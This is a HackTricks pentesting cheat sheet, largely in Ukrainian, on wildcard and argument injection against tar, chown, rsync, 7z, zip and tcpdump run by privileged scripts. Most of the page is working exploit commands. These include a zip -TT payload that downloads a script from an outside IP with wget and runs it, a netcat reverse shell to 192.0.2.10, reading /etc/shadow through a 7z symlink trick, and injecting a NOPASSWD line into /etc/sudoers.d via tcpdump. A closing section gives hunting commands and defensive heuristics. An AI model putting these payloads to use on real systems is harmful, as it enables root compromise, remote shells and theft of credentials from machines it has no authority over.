# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** відбувається, коли привілейований скрипт запускає Unix binary, такий як `tar`, `chown`, `rsync`, `zip`, `7z`, … з неquoted wildcard на кшталт `*`.
> Оскільки shell розгортає wildcard **до** виконання binary, attacker, який може створювати files у working directory, може craft filenames, що починаються з `-`, щоб вони інтерпретувалися як **options instead of data**, effectively smuggling arbitrary flags або навіть commands.
> Ця сторінка збирає найкорисніші primitives, recent research і modern detections для 2023-2025.

## chown / chmod

You can **copy the owner/group or the permission bits of an arbitrary file** by abusing the `--reference` flag:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Коли root пізніше виконує щось на кшталт:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` is injected, causing *all* matching files to inherit the ownership/permissions of `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (combined attack).
See also the classic DefenseCode paper for details.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Виконайте arbitrary commands, зловживаючи функцією **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Коли root запускає, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` виконується як root.

### bsdtar / macOS 14+

У default `tar` у нових версіях macOS (на базі `libarchive`) не реалізовано `--checkpoint`, але все ще можна досягти code-execution за допомогою прапорця **--use-compress-program**, який дозволяє вказати зовнішній компресор.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Коли привілейований скрипт запускає `tar -cf backup.tar *`, буде запущено `/bin/sh`.

---

## rsync

`rsync` дає змогу перевизначити віддалену оболонку або навіть віддалений binary через command-line flags, що починаються з `-e` або `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Якщо root пізніше архівує директорію за допомогою `rsync -az * backup:/srv/`, injected flag запускає your shell на віддаленій стороні.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Навіть коли privileged script *defensively* додає префікс `--` до wildcard, щоб зупинити parsing options, формат 7-Zip підтримує **file list files** шляхом додавання префікса `@` до filename.  Поєднання цього із symlink дає змогу *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Якщо root виконує щось на кшталт:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши вміст у stderr**.

Це працює попри `-- *`, тому що 7-Zip CLI явно приймає як позиційні входи і звичайні імена файлів, і `@listfiles`, тож буквальне ім’я на кшталт `@root.txt` усе ще обробляється особливим чином.

---

## zip

Існують два дуже практичні примітиви, коли застосунок передає підконтрольні користувачеві імена файлів у `zip` (або через wildcard, або перераховуючи імена без `--`).

- RCE через test hook: `-T` вмикає “test archive”, а `-TT <cmd>` замінює tester на довільну програму (довга форма: `--unzip-command <cmd>`). Якщо ви можете інжектити імена файлів, що починаються з `-`, розбийте flags між окремими іменами файлів так, щоб працював розбір short-options:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Notes
- Не намагайтеся використовувати один файл-іменований аргумент на кшталт `'-T -TT <cmd>'` — короткі опції парсяться по одному символу, і це не спрацює. Використовуйте окремі токени, як показано.
- Якщо слеші прибираються з імен файлів додатком, завантажуйте з bare host/IP (default path `/index.html`) і зберігайте локально з `-O`, потім виконуйте.
- Ви можете налагоджувати parsing з `-sc` (show processed argv) або `-h2` (more help), щоб зрозуміти, як ваші токени споживаються.

Example (local behavior on zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Data exfil/leak: Якщо web layer відображає `zip` stdout/stderr (що часто буває в наївних wrappers), injected flags на кшталт `--help` або помилки від некоректних options з’являться в HTTP response, підтверджуючи command-line injection і допомагаючи налаштовувати payload.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

Наступні commands були abused у сучасних CTFs і реальних середовищах. Payload завжди створюється як *filename* у writable directory, який пізніше буде оброблено з wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Read file contents |
| `flock` | `-c <cmd>` | Execute command |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Spawn arbitrary program instead of ssh |

Ці primitives менш поширені, ніж класичні *tar/rsync/zip*, але їх варто перевіряти під час hunting.

---

## Hunting vulnerable wrappers and jobs

Недавні case studies показали, що wildcard/argv injection — це вже не лише проблема **cron + tar**. Цей самий bug class продовжує з’являтися в:

- web features, які "download everything as zip/tar" з upload directories, контрольованих attacker
- vendor/appliance debug shells, що exposing wrapper **tcpdump** з attacker-controlled filename/filter fields
- backup або rotation jobs, які викликають `tar`, `rsync`, `7z`, `zip`, `chown` або `chmod` на writable directories

Корисні triage commands:
```bash
# Hunt for interesting binaries fed with globs or positional user data
rg -n --hidden --follow \
'(tar|bsdtar|rsync|zip|7z|7za|chown|chmod|tcpdump).*(\*|\$@|\$\*)' \
/etc /opt /usr/local /srv 2>/dev/null

# Watch real argv during cron/systemd execution
pspy64 -pf -i 1000 | rg 'tar|rsync|zip|7z|tcpdump|chown|chmod'

# Sudoers rules that constrain one argument but still allow extra flags
sudo -l
rg -n 'tcpdump|zip|tar|rsync' /etc/sudoers /etc/sudoers.d 2>/dev/null
```
Швидкі heuristics:

- `-- *` — це гарний фікс для багатьох GNU tools, але **не** для `7z`/`7za`, бо `@listfiles` парсяться окремо.
- Для `zip` шукайте wrappers, які напряму перелічують user-controlled filenames; short-option splitting (`-T` + `-TT <cmd>`) усе ще працює навіть без shell glob.
- Для `tcpdump` особливо звертайте увагу на wrappers, що дозволяють контролювати **output file names**, **rotation settings** або аргументи **capture-file replay**.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

Коли restricted shell або vendor wrapper будує `tcpdump` command line шляхом конкатенації user-controlled fields (наприклад, параметра "file name") без суворого quoting/validation, можна підсунути додаткові `tcpdump` flags. Комбінація `-G` (time-based rotation), `-W` (limit number of files) і `-z <cmd>` (post-rotate command) дає arbitrary command execution від імені user, який запускає tcpdump (часто root на appliances).

Preconditions:

- Ви можете впливати на `argv`, що передається в `tcpdump` (наприклад, через wrapper на кшталт `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper не санітизує пробіли або `-`-prefixed tokens у полі file name.

Classic PoC (виконує reverse shell script із writable path):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Details:

- `-G 1 -W 1` примушує негайну rotate після першого matching packet.
- `-z <cmd>` запускає post-rotate command один раз на кожну rotation. Багато builds виконують `<cmd> <savefile>`. Якщо `<cmd>` є script/interpreter, переконайтеся, що обробка argument відповідає вашому payload.

No-removable-media variants:

- Якщо у вас є будь-яка інша primitive для запису файлів (наприклад, окремий command wrapper, що дозволяє output redirection), покладіть ваш script у відомий path і запустіть `-z /bin/sh /path/script.sh` або `-z /path/script.sh` залежно від platform semantics.
- Деякі vendor wrappers rotate до attacker-controllable locations. Якщо ви можете вплинути на rotated path (symlink/directory traversal), ви можете спрямувати `-z` на execution content, яким ви повністю керуєте, без external media.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Дуже поширений sudoers anti-pattern:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Проблеми
- `*` glob і permissive patterns обмежують лише перший аргумент `-w`. `tcpdump` приймає кілька `-w` options; перемагає останній.
- Правило не фіксує інші options, тож `-Z`, `-r`, `-V` тощо дозволені.

Primitives
- Override destination path за допомогою другого `-w` (перший лише задовольняє sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal всередині першого `-w`, щоб вийти за межі обмеженого дерева:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Примусово встановити ownership output з `-Z root` (створює файли, що належать root, будь-де):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Запис довільного вмісту шляхом повторного відтворення crafted PCAP через `-r` (наприклад, щоб додати рядок sudoers):

<details>
<summary>Створіть PCAP, що містить точний ASCII payload, і запишіть його як root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Arbitrary file read/secret leak with `-V <file>` (interprets a list of savefiles). Error diagnostics often echo lines, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## References

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)
- [Elastic - Potential Shell via Wildcard Injection Detected](https://www.elastic.co/guide/en/security/current/prebuilt-rule-8-19-20-potential-shell-via-wildcard-injection-detected.html)

{{#include ../../banners/hacktricks-training.md}}
